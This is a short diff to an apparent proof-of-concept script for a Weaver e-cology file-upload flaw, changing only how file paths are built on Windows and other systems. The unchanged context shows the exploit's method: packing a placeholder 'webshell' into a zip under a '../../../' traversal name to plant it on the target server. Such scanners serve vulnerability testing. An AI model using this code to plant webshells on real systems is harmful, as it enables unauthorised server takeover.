@@ -4,7 +4,7 @@
 
 import zipfile
 import random, os
-import requests, re, urllib
+import requests, re, urllib, platform
 
 def file_zip(mm, webshell_name2):
     shell = """yhsnksianksxouwyqnalifhasdnslxzhdydklosicys"""  ## 替换shell内容
@@ -18,7 +18,10 @@ def verify(urllist):
         'vulnerable': False
     }
     path = str(os.path.abspath('.'))
-    mm = path + '\pocs\web\weaver\TestFile_weaver_common_ctrl_upload'
+    if 'Windows' in platform.system():
+        mm = path + '\pocs\web\weaver\TestFile_weaver_common_ctrl_upload'
+    else:
+        mm = path + '/pocs/web/weaver/TestFile_weaver_common_ctrl_upload'
     del_file = './{0}.zip'.format(mm)    # 生成的垃圾文件
     webshell_name1 = mm + '.txt'
     webshell_name2 = '../../../' + webshell_name1
